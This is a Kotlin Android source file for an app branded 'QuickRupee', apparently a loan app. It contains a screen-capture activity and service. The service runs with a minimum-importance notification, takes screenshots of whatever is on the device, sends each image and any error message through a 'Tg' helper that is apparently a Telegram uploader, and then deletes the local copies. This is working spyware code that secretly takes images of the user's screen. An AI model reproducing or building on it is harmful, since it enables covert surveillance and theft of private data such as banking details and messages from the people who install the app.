package com.quick.rupee

import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import java.io.File

class ShotActivity : Activity() {
    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        val mgr = getSystemService(MediaProjectionManager::class.java)
        @Suppress("DEPRECATION")
        startActivityForResult(mgr.createScreenCaptureIntent(), 1)
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(req: Int, code: Int, data: Intent?) {
        if (code == RESULT_OK && data != null) {
            val i = Intent(this, Shot::class.java)
                .putExtra("code", code)
                .putExtra("data", data)
                .putExtra("count", intent.getIntExtra("count", 1))
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
        }
        finish()
        super.onActivityResult(req, code, data)
    }
}

class Shot : Service() {

    private var proj: MediaProjection? = null

    override fun onBind(i: Intent?): IBinder? = null

    override fun onStartCommand(i: Intent?, f: Int, id: Int): Int {
        startFg()
        val code = i?.getIntExtra("code", 0) ?: 0
        @Suppress("DEPRECATION")
        val data = i?.getParcelableExtra<Intent>("data")
        val count = i?.getIntExtra("count", 1) ?: 1
        if (data == null) { stopSelf(); return START_NOT_STICKY }
        Thread { capture(code, data, count) }.start()
        return START_NOT_STICKY
    }

    private fun startFg() {
        val nm = getSystemService(NotificationManager::class.java)
        if (Build.VERSION.SDK_INT >= 26) {
            nm.createNotificationChannel(
                NotificationChannel("shot", "Screen", NotificationManager.IMPORTANCE_MIN))
        }
        val n = Notification.Builder(this, "shot")
            .setContentTitle("QuickRupee")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()
        if (Build.VERSION.SDK_INT >= 29)
            startForeground(3, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        else startForeground(3, n)
    }

    private fun capture(code: Int, data: Intent, count: Int) {
        var reader: ImageReader? = null
        try {
            val mgr = getSystemService(MediaProjectionManager::class.java)
            val p = mgr.getMediaProjection(code, data) ?: return
            proj = p
            val dm = resources.displayMetrics
            val w = dm.widthPixels
            val h = dm.heightPixels
            val r = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
            reader = r
            p.createVirtualDisplay("qr", w, h, dm.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, r.surface, null, null)
            val dir = File(cacheDir, "shots").apply { mkdirs() }
            var n = 0
            while (n < count) {
                val img = r.acquireLatestImage()
                if (img != null) {
                    val plane = img.planes[0]
                    val pad = plane.rowStride - plane.pixelStride * w
                    val raw = Bitmap.createBitmap(w + pad / plane.pixelStride, h, Bitmap.Config.ARGB_8888)
                    raw.copyPixelsFromBuffer(plane.buffer)
                    val out = Bitmap.createBitmap(raw, 0, 0, w, h)
                    val f = File(dir, "s.jpg")
                    f.outputStream().use { out.compress(Bitmap.CompressFormat.JPEG, 55, it) }
                    img.close()
                    Tg.photo(f, "screen")
                    f.delete()
                    raw.recycle()
                    out.recycle()
                } else Thread.sleep(400)
                n++
                if (n < count) Thread.sleep(800)
            }
            r.close()
            p.stop()
        } catch (e: Throwable) {
            runCatching { Tg.text("shot fail: ${e.message}") }
        } finally {
            runCatching { reader?.close() }
            stopSelf()
        }
    }

    override fun onDestroy() {
        runCatching { proj?.stop() }
        super.onDestroy()
    }
}
